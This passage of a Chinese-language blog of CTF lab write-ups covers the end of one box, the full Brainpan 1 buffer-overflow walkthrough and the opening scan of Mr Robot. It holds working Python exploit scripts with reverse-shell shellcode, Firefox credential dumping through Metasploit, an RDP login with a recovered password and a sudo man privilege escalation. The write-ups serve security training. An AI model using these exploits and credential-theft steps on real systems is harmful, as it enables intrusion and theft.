  <span class="hljs-built_in">print</span>(<span class="hljs-string">"message:"</span>)
  s.send(<span class="hljs-built_in">bytes</span>(buffer + <span class="hljs-string">'\r\n'</span>, <span class="hljs-string">"latin-1"</span>))
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"Done!"</span>)
<span class="hljs-keyword">except</span>:
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"Could not connect."</span>)</code></pre>
<p>运行之前开监听，即可shell</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839814.png" alt="image-20240603115734399"></p>
<h2 id="权限提升">权限提升</h2>
<p>这种思路没见过。。。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839815.png" alt="image-20240603120650319"></p>
<p>根据wp阐述，这里当前目录发现firefox.lnk，这是浏览器的快捷键，然后他就联想到了：</p>
<blockquote>
<p>从浏览器缓存中检索登录凭据是权限提升的路径之一，而在 windows 文件中有一个已知路径会默认保存firefox 浏览器的缓存</p>
</blockquote>
<p>在进行谷歌搜索之后我们会找到如下路径：</p>
<pre><code class="hljs scss">C:\Users\{user}\AppData\Roaming\Mozilla\Firefox\Profiles\</code></pre>
<p>在本实验中user是natbat，所以我们可以在以下路径可以找到浏览器缓存文件。</p>
<pre><code class="hljs scss">C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\</code></pre>
<p>这里可以利用msf的模块来利用，那这样的话，我们使用msf监听</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839816.png" alt="image-20240603121944363"></p>
<p>接着挂到后台，利用post/multi/gather/firefox_creds模块</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839817.png" alt="image-20240603122005410"></p>
<p>最终得到如上数据，由上图可知转存储的文件在/root/.msf4/loot/路径下 并且可知这些文件的初始名称为cert9.db、cookies.sqlite、key4.db和 logins.json</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839818.png" alt="image-20240603122355888"></p>
<p>Firefox 存储文件解密脚本（以下两个脚本都可使用，本文选择使用第一个）：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/lclevy/firepwd">https://github.com/lclevy/firepwd</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/unode/firefox_decrypt">https://github.com/unode/firefox_decrypt</a></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839819.png" alt="image-20240603122714345"></p>
<p>得到站点的登陆密码，接着他们想到了3389登录。。。。</p>
<pre><code class="hljs scss">xfreerdp /u:mayor /p:<span class="hljs-number">8</span>CL7O1N78MdrCIsV /cert:ignore /v:<span class="hljs-number">10.10</span>.<span class="hljs-number">71.25</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839820.png" alt="image-20240603122922776"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839821.png" alt="image-20240603123007963"></p>
<p>桌面发现flag</p>
<h2 id="总结">总结</h2>
<p>首先是常规扫描，发现存在SMB端口，3389以及一个类似聊天功能的端口31337。首先是枚举了SMB，发现存在exe二进制文件，下载到本地，nc到端口测试，发现会进行聊天回复等功能。尝试发送大量字符串，发现存在缓冲区溢出。</p>
<p>接着就是放到本地进行测试，思路常规，但最终拿flag的时候，遇到新姿势，在简单的拿到user.txt的时候，找不到root.txt，没思路之后，看了wp，发现当前目录有一个火狐浏览器的快捷键，于是可以想到，转储里面的缓存数据，可能会有敏感信息，然后就顺其自然的，转为msf的shell，用其中的firefox_creds模块。dump其中的数据，接着利用专用firefox解密脚本，可以解密得到其中的数据，发现存在一个web站点的用户名和密码，于是想到3389远程登陆，发现成功，桌面存在root.txt</p>
<h1 id="0x15-brainpan-1">0x15 Brainpan 1</h1>
<p>Brainpan 非常适合 OSCP 练习，强烈建议在考试前完成。通过分析 Linux 计算机上的 Windows 可执行文件来利用缓冲区溢出漏洞。如果你被困在这台机器上，不要放弃（或看文章），只要更努力。</p>
<p>所有功劳都归功于 <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/brainpan-1,51/">superkojiman</a>  - 本机在创作者的明确许可下在此处使用&lt;3</p>
<h2 id="常规扫描">常规扫描</h2>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145160.png" alt="image-20240604091314722"></p>
<p>进一步针对这两个端口进行扫描</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145161.png" alt="image-20240604091605544"></p>
<p>nc链接了一下9999端口，发现是一个交互式系统</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145162.png" alt="image-20240604091716435"></p>
<h2 id="目录探测">目录探测</h2>
<p>由于上述开了一个10000端口，看信息知道是一个用python开启的http简单服务，扫目录发现存在/bin目录</p>
<pre><code class="hljs scss">gobuster dir -u "http://<span class="hljs-number">10.10</span>.<span class="hljs-number">94.137</span>:<span class="hljs-number">10000</span>/<span class="hljs-string">" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,js,cgi,txt,html,css,sh,py -t 30</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145163.png" alt="image-20240604092807206"></p>
<p>访问发现是一个二进制文件</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145164.png" alt="image-20240604092841221"></p>
<p>我们wget下载下来即可</p>
<pre><code class="hljs scss">wget http://<span class="hljs-number">10.10</span>.<span class="hljs-number">94.137</span>:<span class="hljs-number">10000</span>/bin/brainpan.exe</code></pre>
<p>接下来将二进制文件转入到我们的本地环境上进行测试</p>
<h2 id="fuzzing">Fuzzing</h2>
<p>编写测试脚本</p>
<pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/env python3</span>
<span class="hljs-keyword">import</span> socket, time, sys

ip = <span class="hljs-string">"192.168.246.242"</span>
port = <span class="hljs-number">9999</span>
timeout = <span class="hljs-number">5</span>
<span class="hljs-comment">#prefix = "OVERFLOW10 "</span>

<span class="hljs-comment">#string = prefix + "A" * 100</span>
string = <span class="hljs-string">"A"</span> * <span class="hljs-number">100</span>

<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
  <span class="hljs-keyword">try</span>:
    <span class="hljs-comment">#AF_INET常量用于指定IPv4地址族，SOCK_STREAM常量用于指定流式套接字</span>
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.settimeout(timeout)
        <span class="hljs-comment"># 参数是一个元组</span>
      s.connect((ip, port))
      s.recv(<span class="hljs-number">1024</span>)
      <span class="hljs-comment">#print("Fuzzing with {} bytes".format(len(string) - len(prefix)))</span>
      <span class="hljs-built_in">print</span>(<span class="hljs-string">"Fuzzing with {} bytes"</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">len</span>(string)))
      s.send(<span class="hljs-built_in">bytes</span>(string + <span class="hljs-string">'\r\n'</span>,<span class="hljs-string">"latin-1"</span>))
      s.recv(<span class="hljs-number">1024</span>)
  <span class="hljs-keyword">except</span>:
    <span class="hljs-comment">#print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"Fuzzing crashed at {} bytes"</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">len</span>(string)))
    sys.exit()
  string += <span class="hljs-string">"A"</span> * <span class="hljs-number">100</span>
  time.sleep(<span class="hljs-number">1</span>)</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145165.png" alt="image-20240604094934759"></p>
<p>经过fuzz发现，溢出字符大概在600处，我们利用msf生成一个700长度的字符串发送看看</p>
<h2 id="寻找eip">寻找EIP</h2>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145166.png" alt="image-20240604095140565"></p>
<p>发送之后利用mona查看EIP的offset，发现是524</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145167.png" alt="image-20240604095133046"></p>
<p>接下来脚本测试，看看我们是否能够成功覆盖这个EIP</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> socket

ip = <span class="hljs-string">"192.168.246.242"</span>
port = <span class="hljs-number">9999</span>

username = <span class="hljs-string">"hybcx"</span>

<span class="hljs-comment">#prefix = "OVERFLOW7 "</span>
prefix = <span class="hljs-string">""</span>
offset = <span class="hljs-number">524</span>
overflow = <span class="hljs-string">"A"</span> * offset
retn = <span class="hljs-string">"BBBB"</span>
padding = <span class="hljs-string">""</span>
payload = <span class="hljs-string">""</span>
postfix = <span class="hljs-string">""</span>

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

<span class="hljs-keyword">try</span>:
  s.connect((ip, port))
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"Sending evil buffer..."</span>)
  s.recv(<span class="hljs-number">1024</span>)
  <span class="hljs-comment">#s.send(bytes(username + "\r\n", "latin-1"))</span>
  <span class="hljs-comment">#s.recv(1024)</span>
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"message:"</span>)
  s.send(<span class="hljs-built_in">bytes</span>(buffer + <span class="hljs-string">'\r\n'</span>, <span class="hljs-string">"latin-1"</span>))
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"Done!"</span>)
<span class="hljs-keyword">except</span>:
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"Could not connect."</span>)</code></pre>
<p>可以看到我们成功覆盖EIP此时的地址为BBBB</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145168.png" alt="image-20240604095427790"></p>
<h2 id="确定badchars">确定badchars</h2>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> socket

ip = <span class="hljs-string">"192.168.246.242"</span>
port = <span class="hljs-number">9999</span>

username = <span class="hljs-string">"hybcx"</span>

<span class="hljs-comment">#prefix = "OVERFLOW7 "</span>
prefix = <span class="hljs-string">""</span>
offset = <span class="hljs-number">524</span>
overflow = <span class="hljs-string">"A"</span> * offset
retn = <span class="hljs-string">"BBBB"</span>
padding = <span class="hljs-string">""</span>
payload = <span class="hljs-string">"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"</span>
postfix = <span class="hljs-string">""</span>

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

<span class="hljs-keyword">try</span>:
  s.connect((ip, port))
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"Sending evil buffer..."</span>)
  s.recv(<span class="hljs-number">1024</span>)
  <span class="hljs-comment">#s.send(bytes(username + "\r\n", "latin-1"))</span>
  <span class="hljs-comment">#s.recv(1024)</span>
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"message:"</span>)
  s.send(<span class="hljs-built_in">bytes</span>(buffer + <span class="hljs-string">'\r\n'</span>, <span class="hljs-string">"latin-1"</span>))
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"Done!"</span>)
<span class="hljs-keyword">except</span>:
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"Could not connect."</span>)</code></pre>
<p>编写上述脚本发送，发现不存在badchars，那直接寻找JMP ESP即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145169.png" alt="image-20240604100037146"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145170.png" alt="image-20240604100248693"></p>
<p>如上图说是，只有一个地址：0x311712f3=》\xf3\x12\x17\x31</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> socket                                                                                                                            
                                                                                                                                         
ip = <span class="hljs-string">"10.10.94.137"</span>                                                                                                                       
port = <span class="hljs-number">9999</span>	                                                                                                                             
                                                                                                                                         
username = <span class="hljs-string">"hybcx"</span>                                                                                                                       
                                                                                                                                         
<span class="hljs-comment">#prefix = "OVERFLOW7 "                                                                                                                   </span>
prefix = <span class="hljs-string">""</span>                                                                                                                              
offset = <span class="hljs-number">524</span>                                                                                                                             
overflow = <span class="hljs-string">"A"</span> * offset                                                                                                                  
retn = <span class="hljs-string">"\xf3\x12\x17\x31"</span>                                                                                                                
padding = <span class="hljs-string">"\x90"</span> * <span class="hljs-number">32</span>                                                                                                                    
payload =  <span class="hljs-string">""</span>
payload += <span class="hljs-string">"\xba\x96\x9d\x5b\xe0\xda\xd8\xd9\x74\x24\xf4\x58"</span>
payload += <span class="hljs-string">"\x2b\xc9\xb1\x12\x83\xe8\xfc\x31\x50\x0e\x03\xc6"</span>
payload += <span class="hljs-string">"\x93\xb9\x15\xd7\x70\xca\x35\x44\xc4\x66\xd0\x68"</span>
payload += <span class="hljs-string">"\x43\x69\x94\x0a\x9e\xea\x46\x8b\x90\xd4\xa5\xab"</span>
payload += <span class="hljs-string">"\x98\x53\xcf\xc3\x10\xaf\x6e\xd8\x4d\xad\x70\xcb"</span>
payload += <span class="hljs-string">"\x3e\x38\x91\x43\x26\x6b\x03\xf0\x14\x88\x2a\x17"</span>
payload += <span class="hljs-string">"\x97\x0f\x7e\xbf\x46\x3f\x0c\x57\xff\x10\xdd\xc5"</span>
payload += <span class="hljs-string">"\x96\xe7\xc2\x5b\x3a\x71\xe5\xeb\xb7\x4c\x66"</span>                                                                                                  
postfix = <span class="hljs-string">""</span>                                                                                                                             
                                                                                                                                         
buffer = prefix + overflow + retn + padding + payload + postfix                                                                          
                                                                                                                                         
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)                                                                                    
                                                                                                                                         
<span class="hljs-keyword">try</span>:                                                                                                                                     
  s.connect((ip, port))                                                                                                                  
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"Sending evil buffer..."</span>)                                                                                                       
  s.recv(<span class="hljs-number">1024</span>)                                                                                                                          
  <span class="hljs-comment">#s.send(bytes(username + "\r\n", "latin-1"))                                                                                           </span>
  <span class="hljs-comment">#s.recv(1024)                                                                                                                          </span>
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"message:"</span>)                                                                                                                      
  s.send(<span class="hljs-built_in">bytes</span>(buffer + <span class="hljs-string">'\r\n'</span>, <span class="hljs-string">"latin-1"</span>))                                                                                              
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"Done!"</span>)                                                                                                                         
<span class="hljs-keyword">except</span>:                                                                                                                                  
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"Could not connect."</span>)</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145171.png" alt="image-20240604102033538"></p>
<h2 id="提升权限">提升权限</h2>
<p>这里用msfvenom生成的linux的shell，然后就是信息搜集，提权。</p>
<p>首先键入sudo -l，发现下图</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145172.png" alt="image-20240604104003648"></p>
<p>发现当前用户能够执行这个程序（以root身份），那我们sudo一下</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145173.png" alt="image-20240604104042944"></p>
<p>发现三个选项，测试了一下，发现第三个manual能够执行某些命令，果然，没思路了，看了wp原来是manual这个名字有说法的</p>
<p>问gpt，这个manual是man命令的别名，而man是可以提权的，我们搜一下即可，如下图所示</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145174.png" alt="image-20240604104254216"></p>
<p>我们只需要键入manual man，然后输入上图指示的内容即可，这里下图的最后一个man我多余了，不必在意</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145175.png" alt="image-20240604103713719"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145176.png" alt="image-20240604104507710"></p>
<p>同时这里上图的内容是我的本地测试</p>
<h2 id="总结">总结</h2>
<p>首先常规扫描，发现两个端口，其中一个是web server服务，扫目录发现存在exe二进制文件，同时这个exe运行之后就是对应的另一个端口的服务，交互式服务吧。然后发现，发送大量数据会造成程序崩溃，猜测缓冲区溢出漏洞。接着将exe放到本地进行测试，思路不赘述了，做了n个了</p>
<p>提示是linux系统，我们msf生成linux的反弹shell之后，首先python生成稳定的shell，然后尝试提权，信息搜集发现sudo -l存在一个可以无密码执行的程序，以root身份，执行之后发现存在manual，也就是man命令的别名，那我们想到man提权。直接网站看着payload打即可。</p>
<h1 id="0x16-mr-robot-ctf">0X16 Mr Robot CTF</h1>
<h2 id="常规枚举">常规枚举</h2>
<pre><code class="hljs scss">nmap ip -<span class="hljs-selector-tag">p</span>-</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407082145177.png" alt="image-20240618093202846"></p>
<p>进一步扫描</p>
<pre><code class="hljs scss">nmap -sV -sC -<span class="hljs-selector-tag">A</span> <span class="hljs-number">10.10</span><span class="hljs-selector-class">.171</span><span class="hljs-selector-class">.59</span> -p22,<span class="hljs-number">80</span>,<span class="hljs-number">443</span></code></pre>
<pre><code class="hljs scss">PORT    STATE  SERVICE  VERSION
<span class="hljs-number">22</span>/tcp  closed ssh
<span class="hljs-number">80</span>/tcp  open   http     Apache httpd
|_http-server-<span class="hljs-selector-tag">header</span>: Apache
|_http-title: Site doesn<span class="hljs-string">'t have a title (text/html).</span>
